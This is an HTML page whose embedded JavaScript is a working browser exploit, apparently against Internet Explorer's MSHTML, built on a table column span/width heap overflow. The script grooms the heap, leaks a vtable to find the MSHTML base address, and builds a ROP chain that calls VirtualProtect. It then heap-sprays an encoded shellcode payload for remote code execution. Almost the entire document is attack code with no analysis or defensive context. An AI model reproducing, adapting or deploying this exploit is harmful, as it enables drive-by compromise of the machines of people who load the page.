<html>
<body>
<div id="fun"></div>
<div id="button_container"></div>
<table style="table-layout:fixed" >
    <col id="132" width="41" span="9" >&nbsp </col>
</table>
<script>

/************** GLOBALS *****************/
var shellcode = unescape("%uec83%u9064%u98b8%u5528%uda45%ud9c9%u2474%u31f4%ub1c9%u5b33%u4331%u8313%ufceb%u4303%uca97%ub9a0%u834f%u424b%uf48f%ua7c2%u26be%uacb0%uf692%ue1b2%u7c1e%u1196%uf095%u153f%ube1e%u1819%u0e9f%uf6a6%u1063%u055a%uf2b7%uc663%uf3ca%u3ba4%ua124%u377d%u5696%u0509%u562a%u01dd%u2012%ud558%u9ae6%u0663%u9056%ube2c%ufedd%ubf8c%u1d32%uf6f0%ud63f%u0882%u26e9%u3b6a%ue5d5%uf355%uf4d8%u3492%u8302%u46e8%u94bf%u342a%u101b%u9eaf%u82e8%u1e0b%u543d%u2cdf%u128a%u3087%uf60d%u4db3%uf986%uc413%udddc%u8cb7%u7c87%u68e1%u8066%ud5f1%u24d7%uf779%u5e0c%u9220%ud2d3%udb5e%uecd3%u4c60%uddbb%u03eb%ue1bc%u6039%ua832%uc160%u75da%u53f1%u8587%u972f%u05b1%u68da%u1546%u6daf%u9103%u1c43%u741c%ub364%u5d1d%u5207%u3d8d%uf1e6%ua735%uf3f6");

    var div_container = document.getElementById("button_container");
    div_container.style.cssText = "display:none";

    free_block = new Array();
    a_block = new Array();
    b_block = new Array();
    base = 0

/************** HELPERS *****************/
    function vprotect_wrapper(){
        str  =  pack(0x0780c700)// return address to location of shellcode
        str +=  pack(0x0780c600) // address to start virtual protect
        str +=  pack(0x9999) // size of protect call
        str +=  pack(0x40) // new protect privelege 0x40 read write execute not 0x10 lol
        str +=  pack(0x0780b200) // old protect not used... garbage
        return str;
    }

    function strtoint(str) {
        return str.charCodeAt(1)*0x10000 + str.charCodeAt(0);
    }

    //Easily create strings of certain length Easier to use for filler then makestring
    function fill(iter,fill)
    {
        var s = "";
        var count = 0;
        do {
            s += fill;
            count += 1;
        } while (count < iter);

        return s;
    }

    // Turns 0xdeadbeef into \ubeef\udead
    function pack(string){
        var str = string.toString(16)
        while(str.length < 8){
            var x = "0"
            x += str;
            str = x;
        }
        var chunks = []
        var chunksize = 4;

        while (str){
            if(str.length < chunksize) {
                chunks.push(str)
                break;
            }
            else {
                chunks.push(str.substr(0,chunksize))
                str = str.substr(chunksize)
            }
        }
        return  unescape("%u" + chunks[1] + "%u" + chunks[0])
    }

    //Calculates current location of gadgets with current MSHTML base
    function calc(offset){
        return pack( base+ offset )
    }

/************** EXPLOIT *****************/

    function heap_set(){
        var free = fill(125, "F");
        var string1 = fill(125, "A")
        var string2 = fill(125, "B")

        /****
        HEAP LOOKS LIKE THIS 
        FREE BLOCK
        0xfa F's <--- freed buffer will go into one of these freed F blocks
        0xfa A's
        0xfa B's 
        button object   0xfc in size
        FREE BLOCK += 2 to allow a little extra space strings are not exact size of buffer just really close
        ****/
        for (var i=0; i < 500; i+=2) {
                free_block[i] = free.substring(0, 125); //SIZE FC ALLOCATED BLOCK SIZE 
                a_block[i] = string1.substring(0, 125);
                b_block[i] = string2.substring(0, 125);
                var obj = document.createElement("button");
                div_container.appendChild(obj);
        }
         
        //free the first string in every block set
        for (var i= 0; i<500; i+=2 ) {
                free_block[i] = null;
        } 
        CollectGarbage();
    }

    function leak(){
        var leak_col = document.getElementById("132");
        leak_col.width = "41"; //what we overwrite wit 41*10 = 0x1004
        leak_col.span = "21"; // how much to overwrite 25 * 18 = 0x1c2
        //overwrite first block of A's and overwrite length parameter from B block
    }

     function get_leak(){
        var i;
        readindex = -1;

        for(i=0;i < 500; i+=2) {
           if(b_block[0].substring(2,b_block[0].length-2)!=b_block[i].substring(2,b_block[0].length-2)) {
              readindex = i;
              break;
           }
        }

        if(readindex == -1) {
           alert("Error overwriring first spray");
           return 0;
        }

        base = strtoint(b_block[readindex].substring(136, 140)) - 1522832; //cbutton vtable to base of mshtml
        if (base < 0){
            document.getElementById("fun").innerHTML  = " I am tired :( "
            return
        }
        var hex = base.toString(16);
        document.getElementById("fun").innerHTML  = " BASE OF MSHTML " + hex
    
        heapspray();
   
        //FINAL TRIGGER OVERWRITE CBUTTON VTABLE WHICH IS USED IN CALCULATIONS LATER GIVING RCE
        var obj_col_0 = document.getElementById("132");
        obj_col_0.width = "1258800"                 // specifying another malicious value 0x7ffffe4
        obj_col_0.span = "31";                      // specifying amount of bytes to overwrite


    }

    function heapspray() {
        // calc(0x1f9f3)  Int3 for dbeugging purposes : ccc3

        /***
         ROP CHAIN Pseudo Code
         mov    eax, Virtual_Protect_IAT
         mov    eax, [eax]
         push   virtual_protect_struct
         call   eax
         return to shellcode
        ***/

        // 
        // ROP CHAIN HERE      MNEMOMIC                         BYTES
        rop =  calc(0x29e1)    // pop ebx pop ebp ret           : 5b5dc3
        rop += pack(0xdead0000)// 
        rop += calc(0x117ef)   // xchg eax, esp ret             : 94c3
        rop += calc(0x1148d)   // pop     eax                   : 58c3
        rop += calc(0x1308)    // IAT pointer to vprotect
        rop += calc(0x9f5c9)   // mov     eax,dword ptr [eax]   : 8b00 
        rop += calc(0x2d7fe)   // push    eax                   : 50c3
        rop += vprotect_wrapper(); // pushing arguments for vprotect
        rop += fill(150, "\u9090")
        rop += shellcode


        b = fill(422, "\u4141") //fill till eip
        b += rop
        var str =  b;
        var padding = "\u4343"
        while (str.length < 1000)
            str += padding;

        while (str.length < 100000)
            str = str + str;

        foo = str.substr(0, 64*1024/2);

        //REPEAT FOR 16 MB
        nop = "";
        for(var i = 0; i < 16; ++i){
            nop += foo;
        }

        x = new Array();
     
        for (var i = 0; i < 100; i++) { 
            x[i] = nop.substring(0, nop.length);
        }
    }

    heap_set();
    setTimeout(function(){leak()}, 400);
    setTimeout(function(){get_leak()},750);
  
</script>
</body>
</html>
